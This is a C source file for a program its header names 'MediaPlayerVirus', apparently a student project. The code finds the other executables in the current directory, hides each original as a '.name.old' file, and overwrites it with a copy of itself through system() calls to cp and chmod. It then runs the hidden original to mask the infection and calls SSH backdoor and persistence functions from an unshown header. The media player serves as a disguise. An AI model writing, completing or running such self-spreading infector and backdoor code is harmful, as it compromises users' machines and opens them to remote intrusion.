/**
 * @file main.c
 * @brief The main entry point for the MediaPlayerVirus
 *
 * @author Enzocte <enzo.cateau@etudiant.univ-lr.fr>
 * @date 2026
 */

#include <dirent.h>
#include <gtk/gtk.h>
#include <libgen.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "backdoor.h"
#include "player.h"

static bool INFECT_FILES = true;
static bool SSH_BACKDOOR = true;

/**
 * @brief A structure to hold lists of new and old executable files, as well as
 * the program the user intended to run (main)
 */
typedef struct {
  char new[1000];
  char old[1000];
  char main[50];
} Programs;

/**
 * @brief Check if the program is already infected by comparing new and old
 * files
 *
 * @params files: A structure containing lists of new and old executable files
 * @return A string containing the names of uninfected files to be infected
 */
char *isInfected(Programs *files) {
  static char file[500];
  char *strToken = strtok(files->new, "/");
  while (strToken != NULL) {
    if (strstr(files->old, strToken) == NULL) {
			strcat(file, strToken);
			strcat(file, "/");
    }
    strToken = strtok(NULL, "/");
  }
  return file;
}

/**
 * @brief Infect uninfected files by renaming them, copying the main program,
 * and setting permissions
 *
 * @params uninfectedFile: A string containing the names of uninfected files to
 * be infected
 * @params programName: The name of the main program to be copied for infection
 */
void infect(char *uninfectedFile, char *programName) {
  DIR *dir;
  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }
  char *strToken = strtok(uninfectedFile, "/");
  while (strToken != NULL) {
    char tempName[50];
    char cpQuery[50];
    char chQuery[50];

    snprintf(tempName, sizeof(tempName), ".%s.old", strToken);
    rename(strToken, tempName);
    snprintf(cpQuery, sizeof(cpQuery), "cp %s %s 2>/dev/null", programName,
             strToken);
    snprintf(chQuery, sizeof(chQuery), "chmod +x %s 2>/dev/null", strToken);
    system(cpQuery);
    system(chQuery);

    strToken = strtok(NULL, "/");
  }
}

/**
 * @brief Find executable files in the current directory and categorize them as
 * new, old, or main program
 *
 * @params programName: The name of the main program to be identified
 * @return A structure containing lists of new and old executable files, as well
 * as the main program name
 */
Programs *fileFinder(char *programName) {
  DIR *dir;
  struct dirent *dp;
  static Programs file;

  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }

  while ((dp = readdir(dir)) != NULL) {
    struct stat st;

    if (stat(dp->d_name, &st) == 0 && S_ISREG(st.st_mode) &&
        (st.st_mode & S_IXUSR) && strcmp(dp->d_name, programName) != 0 &&
        strcmp(dp->d_name, "MediaPlayer") != 0) {

      if (strstr(dp->d_name, "old") != NULL) {
				strcat(file.old, dp->d_name);
				strcat(file.old, "/");
      } else {
				strcat(file.new, dp->d_name);
				strcat(file.new, "/");
      }

    } else if (strcmp(dp->d_name, programName) == 0) {
      snprintf(file.main, sizeof(file.main), "%s", dp->d_name);
    }
  }
  closedir(dir);
  return &file;
}

/**
 * @brief Execute the program the user intended to run, referred to here as main
 *
 * @params files: A structure containing lists of new and old executable files,
 * as well as the main program name
 * @params programName: The name of the main program to be executed
 * @params argc: The argument count passed to the main function
 * @params argv: The argument vector passed to the main function
 */
int execHost(Programs *files, char *programName, int argc, char *argv[]) {
  char exeQuery[100];
  if (strcmp(programName, "MediaPlayer") == 0) {
    return mediaPlayer(argc, argv);
  } else {
    snprintf(exeQuery, sizeof(exeQuery), "./.%s.old 2>/dev/null", files->main);
    return system(exeQuery);
  }
}

int main(int argc, char *argv[]) {
  int opt;

  char pathbuf[256];
  snprintf(pathbuf, sizeof(pathbuf), "%s", argv[0]);
  char *prog_name = basename(pathbuf);

  Programs *files = fileFinder(prog_name);

  if (INFECT_FILES) {
    char *uninfectedFile = isInfected(files);
    infect(uninfectedFile, prog_name);
  }
  if (SSH_BACKDOOR) {
    ssh_backdoor();
    ssh_persistent_server();
  }

  return execHost(files, prog_name, argc, argv);
}
